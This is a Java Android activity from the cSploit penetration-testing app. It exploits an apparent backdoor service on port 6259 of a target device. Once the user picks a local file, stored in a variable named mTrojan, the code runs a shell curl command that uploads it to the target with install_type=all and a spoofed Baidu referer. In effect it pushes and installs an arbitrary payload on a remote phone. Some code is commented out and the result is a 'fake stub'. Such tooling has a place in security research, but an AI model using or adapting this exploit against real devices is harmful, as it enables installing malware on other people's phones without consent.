package org.csploit.android.bdcmdlist;

import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.support.v7.app.ActionBarActivity;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.TextView;
import android.widget.Toast;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.util.EntityUtils;
import org.csploit.android.R;

import java.io.File;
import java.io.IOException;
import java.net.URISyntaxException;
import java.net.URLEncoder;

/**
 * Created by heeeeen on 15/5/21.
 */
public class Uploadfile extends ActionBarActivity {

    private TextView mResultView = null;
    private Button m_btFileChoose = null;

    private String mRequestUrl = null;
    private String mBaseUrl = null;
    private String mResult = null;

    private File mTrojan = null;

    Handler mHandler = null;

    private static final int FILE_SELECT_CODE = 0;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        SharedPreferences themePrefs = getSharedPreferences("THEME", 0);
        Boolean isDark = themePrefs.getBoolean("isDark", false);

        if (isDark)
            setTheme(R.style.DarkTheme);
        else
            setTheme(R.style.AppTheme);

        setContentView(R.layout.uploadfile_layout);
        String target = getIntent().getStringExtra("targetIP");
        setTitle("expl0it > " + target + " > uploadfile");
        mBaseUrl = "http://" + target + ":6259/uploadfile?" +
                "callback=x&mcmdf=inapp_x&install_type=all&Filename=";

        m_btFileChoose = (Button) findViewById(R.id.filechooser);


        mResultView = (TextView) findViewById(R.id.uploadfile_result);

        mHandler = new Handler() {
            @Override
            public void handleMessage(Message msg) {
                if (msg.what == 0x01) {

                    mResultView.setText(mResult);
                }
            }

        };

        m_btFileChoose.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                showFileChooser();
/*
                new Thread() {
                    @Override
                    public void run() {
                        try {
                            Log.d("heen","request url is "+mRequestUrl);
                            mResult = sendintent(mRequestUrl);
                            Log.d("heen", "addcontact_result =" + mResult);
                            handler.sendEmptyMessage(0x01);  //finished
                        } catch (Exception e) {

                        }

                    }
                }.start();
            }
        });

*/
            }
        });
    }

    /** 调用文件选择软件来选择文件 **/
    private void showFileChooser() {
        Intent intent = new Intent(Intent.ACTION_GET_CONTENT);
        intent.setType("*/*");
        intent.addCategory(Intent.CATEGORY_OPENABLE);
        try {
            startActivityForResult(Intent.createChooser(intent, "请选择一个要上传的文件"),
                    FILE_SELECT_CODE);
        } catch (android.content.ActivityNotFoundException ex) {
            // Potentially direct the user to the Market with a Dialog
            Toast.makeText(Uploadfile.this, "请安装文件管理器", Toast.LENGTH_SHORT).show();
        }
    }



    private  String getPath(Context context, Uri uri) throws URISyntaxException {
        if ("content".equalsIgnoreCase(uri.getScheme())) {
            String[] projection = { "_data" };
            Cursor cursor = null;

            try {
                cursor = context.getContentResolver().query(uri, projection, null, null, null);
                int column_index = cursor.getColumnIndexOrThrow("_data");
                if (cursor.moveToFirst()) {
                    return cursor.getString(column_index);
                }
            } catch (Exception e) {
                // Eat it
            }
        }
        else if ("file".equalsIgnoreCase(uri.getScheme())) {
            return uri.getPath();
        }

        return null;
    }

    //  encode uri @h33n
    private String GenRequestUrl(String uri){
        String query = null;
        try {

            query = URLEncoder.encode(uri, "utf-8");

        }catch (Exception e){

        }
        return query;
    }

  /*
    private String uploadfile(String myurl, File file) throws IOException {
        String content = null;

        try {

            HttpClient httpClt = new DefaultHttpClient();
            HttpPost httpPost = new HttpPost(mRequestUrl);

            httpPost.setHeader("Referer", "http://www.baidu.com/");
            MultipartEntity mutiEntity = new MultipartEntity();
            mutiEntity.addPart("file", new FileBody(file));

            httpPost.setEntity(mutiEntity);

            HttpResponse httpResponse = httpClt.execute(httpPost);
            HttpEntity httpEntity =  httpResponse.getEntity();
            content = EntityUtils.toString(httpEntity);
            Log.d("heen", "respone is: "+content);
            } catch (Exception e){

        }
        return  content;
    }
*/
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        switch (requestCode) {
            case FILE_SELECT_CODE:
                if (resultCode == RESULT_OK) {
                    // Get the Uri of the selected file
                    Uri uri = data.getData();
                    Log.d("heen", "File Uri: " + uri.toString());
                    String path = null;
                    // Get the path
                    try {
                         path = getPath(Uploadfile.this, uri);
                    } catch(Exception e){

                    }

                    Log.d("heen", "File Path: " + path);

                    // Get the file instance
                    mTrojan = new File(path);
                    // Initiate the upload
                    String fileName = path.substring(path.lastIndexOf("/")+1);
                    mRequestUrl = mBaseUrl + fileName;
                    String uploadCommand = "curl -F file=@"+path+" -e http://www.baidu.com " + mRequestUrl;
                    Log.d("heen", "shell command is "+uploadCommand);
                    try {
                        Process process = Runtime.getRuntime().exec(uploadCommand);
                        process.waitFor();
                    }catch (Exception e){

                    }
                    Log.d("heen", "upload url: " + mRequestUrl);
                    new Thread() {
                         @Override
                         public void run() {
                             try {
                                 Log.d("heen","request url is "+mRequestUrl);
                                  //just let it go,we realize it in the future
                                 mResult = "fake stub"/*uploadfile(mRequestUrl, mTrojan)*/;
                                 Log.d("heen", "addcontact_result =" + mResult);
                                 mHandler.sendEmptyMessage(0x01);  //finished
                             } catch (Exception e) {

                             }

                         }
                     }.start();
                }
                break;
        }
        super.onActivityResult(requestCode, resultCode, data);
    }

}
